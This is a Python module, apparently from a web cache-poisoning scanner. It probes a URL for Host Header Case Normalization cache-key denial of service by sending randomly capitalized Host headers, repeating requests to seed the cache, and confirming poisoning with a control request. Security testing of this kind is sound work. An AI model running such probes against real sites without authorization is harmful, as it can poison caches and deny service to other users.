#!/usr/bin/env python3

"""
Attempts to find Cache Poisoning with Host Header Case Normalization (HHCN)
https://youst.in/posts/cache-key-normalization-denial-of-service/
"""

import utils.proxy as proxy
from utils.style import Colors, Identify
from utils.utils import (
    CONTENT_DELTA_RANGE,
    configure_logger,
    get_domain_from_url,
    random,
    requests,
)

logger = configure_logger(__name__)

VULN_NAME = "Host Header Case Normalization"


def random_domain_capitalization(url: str) -> str:
    """Randomly capitalize characters from the url domain"""
    domain = get_domain_from_url(url)

    index = random.randint(0, len(domain) - 3)
    letter = domain[index]
    if letter != "." and letter != "-":
        letter = domain[index].upper()
    else:
        # Move to previous character if current is . or -
        index = max(0, index - 1)
        letter = domain[index].upper()
    domain = domain[:index] + letter + domain[index + 1 :]
    return domain


def HHCN(
    url: str,
    s: requests.Session,
    main_response: requests.Response,
    authent: tuple[str, str] | None,
    content_delta_range: int = CONTENT_DELTA_RANGE,
) -> None:
    """Attempts to find Cache Poisoning with Host Header Case Normalization"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    headers = {"Host": random_domain_capitalization(url)}
    payload = f"PAYLOAD: {headers}"
    confirmed = ""

    try:
        main_response_size = len(main_response.content)

        probe = s.get(
            url,
            headers=headers,
            verify=False,
            timeout=10,
            auth=authent,
            allow_redirects=False,
        )
        probe_size = len(probe.content)
        behavior = ""
        if not (
            main_response_size - content_delta_range
            < probe_size
            < main_response_size + content_delta_range
        ) or (main_response.status_code != probe.status_code):
            if len(probe.headers) > 0:
                for rf in probe.headers:
                    if "cache" in rf.lower() or "age" in rf.lower():
                        for _ in range(10):
                            req_hhcn_bis = s.get(
                                url,
                                headers=headers,
                                verify=False,
                                timeout=10,
                                auth=authent,
                                allow_redirects=False,
                            )
                    else:
                        req_hhcn_bis = s.get(
                            url,
                            headers=headers,
                            verify=False,
                            timeout=10,
                            auth=authent,
                            allow_redirects=False,
                        )
                        break
            else:
                req_hhcn_bis = s.get(
                    url,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    auth=authent,
                    allow_redirects=False,
                )
            if not (
                main_response_size - content_delta_range
                < probe_size
                < main_response_size + content_delta_range
            ):
                behavior = (
                    f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {probe_size}b"
                )
                print(
                    f" {Identify.behavior} | HHCN | {Colors.BLUE}{url}{Colors.RESET} | {behavior} | {Colors.THISTLE}{payload}{Colors.RESET}"
                )

            if main_response.status_code != probe.status_code:
                behavior = (
                    f"DIFFERENT STATUS-CODE | {main_response_size}b > {probe_size}b"
                )
                print(
                    f" {Identify.behavior} | HHCN | {Colors.BLUE}{url}{Colors.RESET} | {behavior} | {Colors.THISTLE}{payload}{Colors.RESET}"
                )

            if behavior and proxy.proxy_enabled:
                from utils.proxy import proxy_request

                proxy_request(s, "GET", url, headers=headers, data=None)

            control = s.get(url, verify=False, timeout=10, auth=authent)

            if (
                behavior
                and len(req_hhcn_bis.content) == len(control.content)
                and len(control.content) != main_response_size
            ):
                confirmed = f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {len(control.content)}b"
                print(
                    f" {Identify.confirmed} | HHCN | {Colors.BLUE}{url}{Colors.RESET} | {confirmed} | {Colors.THISTLE}{payload}{Colors.RESET}"
                )

            if (
                behavior
                and req_hhcn_bis.status_code == control.status_code
                and control.status_code != main_response.status_code
            ):
                confirmed = f"DIFFERENT STATUS-CODE | {main_response.status_code} > {control.status_code}"
                print(
                    f" {Identify.confirmed} | HHCN | {Colors.BLUE}{url}{Colors.RESET} | {confirmed} | {Colors.THISTLE}{payload}{Colors.RESET}"
                )
            if confirmed and proxy.proxy_enabled:
                from utils.proxy import proxy_request

                proxy_request(s, "GET", url, headers=headers, data=None)

        print(f" {Colors.BLUE} {VULN_NAME} : {headers}{Colors.RESET}\r", end="")
        print("\033[K", end="")
    except requests.exceptions.ConnectionError as e:
        logger.exception(e)
